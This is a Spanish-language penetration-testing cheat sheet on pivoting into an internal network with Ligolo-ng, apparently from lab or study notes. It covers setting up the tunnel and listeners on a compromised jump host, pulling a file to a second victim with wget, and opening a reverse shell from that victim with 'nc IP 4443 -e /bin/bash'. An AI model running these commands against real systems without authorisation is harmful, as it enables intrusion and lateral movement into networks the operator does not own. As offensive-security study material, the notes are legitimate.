# Pivoting con Ligolo 

Tags: #Pivoting #Ligolo 

* [Ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases)

```bash 
# Descargar agente y proxy 

1. Crear una interface de red llamada 'ligolo' en modo tunel en Kali
❯ ip tuntap add $USER mode tun ligolo    
❯ ip link set ligolo up 
❯ ip route add IP.0/24 dev ligolo    # Agregar el segmento al cual se quiere llegar 
	# dev = Dispositivo llamado 'ligolo'


2. Activar el proxy en Kali 
❯ ./proxy -selfcert     # Ejecutar el proxy en Kali con permisos de ejecución


3. Activar el agente en la maquina victima 'salto' en el dir '/tmp'
❯ ./agent -connect IP:Port -ignore-cert    # Ejecutar el agente en la maquina victima con permisos de ejecución
	# IP = Direción IP de Kali
	# Port = Puerto en donde esta escuchando ligolo al ejecutar el proxy 


4. Una vez que la maquina Kali muestre 'Agent join' dar 'Enter' para ingresar a la consola interactivade ligolo
❯ session         # Mostrar las sesiones activas y dar 'Enter' para seleccionar la sesión 
❯ start           # Iniciar el tunelizado al segmento de red 
❯ listener_add --add 0.0.0.0:8080 --to 127.0.0.1:80   # Todo el tráfico que reciba la máquina de salto por el puerto 8080 lo redirigirá al localhost de Kali por el puerto 80
❯ listener_list   # Mirar los 'listeners' activos 
❯ listener_add --add 0.0.0.0:4443 --to 127.0.0.1:443   # Agregar diferentes puertos para las diferentes conexiones. Si no eres un usuario root debes de agregar puertos arriba del numero 1000

5. Al terminar se debe limpiar 
❯ ip route del IP.0/24 dev ligolo    # Eliminar la ruta de la tabla de ruteo 
❯ ip link del ligolo                 # Eliminar la interface llamada 'ligolo'
❯ ip route list                      # Mirar la tabla de enrutamiento 
```

## Compartir un archivo 

```bash 
# Para pasar un archivo desde una segunda maquina victima la cual pertenece al segmento de red no directo a la maquina Kali se hace lo siguiente:

❯ wget http://IP:8080/file.txt    # Ejecutar 'Wget' en la segunda maquina víctima y colocar la IP de la primer maquina víctima 'salto' en lugar de la IP de la maquina de Kali. Esto funcionará por el 'listener' que se ha configurado. 

❯ python3 -m http.server 80       # Compartir el archivo desde Kali por el puerto 80  
```

## Hacer una Revershell 

```bash 
# Para crear una revershell desde una segunda maquina victima la cual pertenece al segmento de red no directo a la maquina Kali se hace lo siguiente: 

❯ nc IP 4443 -e /bin/bash   # Ejecutar 'Netcat' en la segunda maquina víctima y colocar la IP de la primer maquina víctima 'salto' en lugar de la IP de la maquina de Kali. Esto funcionará por el 'listener' que se ha configurado.  

❯ nc -nlvp 443  # Colocarse en escucha en Kali para recibir la revershell por el puerto 80 
```